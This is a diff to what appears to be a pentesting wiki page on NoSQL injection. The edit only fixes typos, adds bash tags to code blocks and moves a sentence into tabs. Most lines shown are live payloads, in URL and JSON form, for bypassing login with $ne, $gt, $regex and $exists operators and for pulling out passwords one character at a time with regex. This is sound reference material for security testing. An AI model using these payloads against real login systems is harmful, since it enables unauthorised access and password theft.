@@ -8,11 +8,11 @@ NoSQL databases provide looser consistency restrictions than traditional SQL dat
 
 #### Authentication Bypass
 
-Using not equal ($ne) or greater ($gt) we can try to bypass authentication
-
 {% tabs %}
 {% tab title="URL" %}
-```
+Using not equal ($ne) or greater ($gt) we can try to bypass authentication
+
+```bash
 username[$ne]=toto&password[$ne]=toto          #Not Equal
 username[$regex]=.*&password[$regex]=.*        #Regex
 username[$exists]=true&password[$exists]=true  #If Exist
@@ -21,7 +21,9 @@ username[$ne]=admin&password[$gt]=0            #Greater
 {% endtab %}
 
 {% tab title="JSON" %}
-```
+Using not equal ($ne) or greater ($gt) we can try to bypass authentication
+
+```bash
 {"username": {"$ne": null}, "password": {"$ne": null} }             #Not Equal
 {"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }           #Not Equal
 {"username": {"$gt": undefined}, "password": {"$gt": undefined} }   #greater
@@ -33,15 +35,15 @@ username[$ne]=admin&password[$gt]=0            #Greater
 
 {% tabs %}
 {% tab title="URL" %}
-We can use regex to find the lenght of a value
+We can use regex to find the length of a value
 
-```
+```bash
 username[$regex]=.{25}&pass[$ne]=1
 ```
 
-We can use regex to extract informations.
+We can use regex to extract information.
 
-```
+```bash
 username[$eq]=admin&password[$regex]=^p
 username[$eq]=admin&password[$regex]=^pa
 username[$eq]=admin&password[$regex]=^pas
@@ -53,21 +55,22 @@ username[$ne]=toto&password[$regex]=^pas
 
 We can use `$nin` (not in) if you don't want to match with some values.
 
-```
+```bash
 #<Matches non of the values of the array> (not test and not admin)
 username[$nin][admin]=admin&username[$nin][test]=test&password[$regex]=^p
 ```
 {% endtab %}
 
 {% tab title="JSON" %}
-We can use regex to find the lenght of a value
-```
+We can use regex to find the length of a value
+
+```bash
 {"username": {"$eq": "admin"}, "password": {"$regex": ".{25}" }}
 ```
 
-We can use regex to extract informations.
+We can use regex to extract information.
 
-```
+```bash
 {"username": {"$eq": "admin"}, "password": {"$regex": "^p" }}
 {"username": {"$eq": "admin"}, "password": {"$regex": "^pa" }}
 {"username": {"$eq": "admin"}, "password": {"$regex": "^pas" }}
@@ -75,14 +78,14 @@ We can use regex to extract informations.
 
 We can use `$nin` (not in) if you don't want to match with some values.
 
-```
+```bash
 #<Matches non of the values of the array> (not test and not admin)
 {"username":{"$nin":["admin", "test"]}, "username":{"$regex": "^user" } ,"password":{"$ne":"1"}} 
 ```
 {% endtab %}
 {% endtabs %}
 
-#### &#x20;MangoDB Injection
+#### MangoDB Injection
 
 {% tabs %}
 {% tab title="Payloads" %}
